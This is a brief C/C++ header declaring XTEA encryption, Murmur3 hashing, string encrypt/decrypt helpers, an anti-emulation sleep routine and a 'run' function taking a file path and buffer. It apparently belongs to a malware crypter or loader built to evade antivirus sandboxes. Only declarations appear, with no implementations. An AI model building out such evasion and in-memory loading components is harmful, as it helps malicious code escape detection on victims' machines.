#pragma once
#include <stdint.h>
#include <windows.h>

static uint32_t MAGIC = 0xBABE2525;

extern "C" {
	void __stdcall XTEA_encrypt(void *lpData, uint32_t ddSize, void *lpKey, uint32_t dkSize);
}

extern "C" {
	void __stdcall XTEA_decrypt(void *lpData, uint32_t ddSize, void *lpKey, uint32_t dkSize);
}

extern "C" {
	uint32_t __stdcall Murmur3 (void *lpData, uint32_t dSize, uint32_t dSeed);
}

void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key);
void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait);
void run(uintptr_t base, LPSTR szFilePath, PVOID pFile);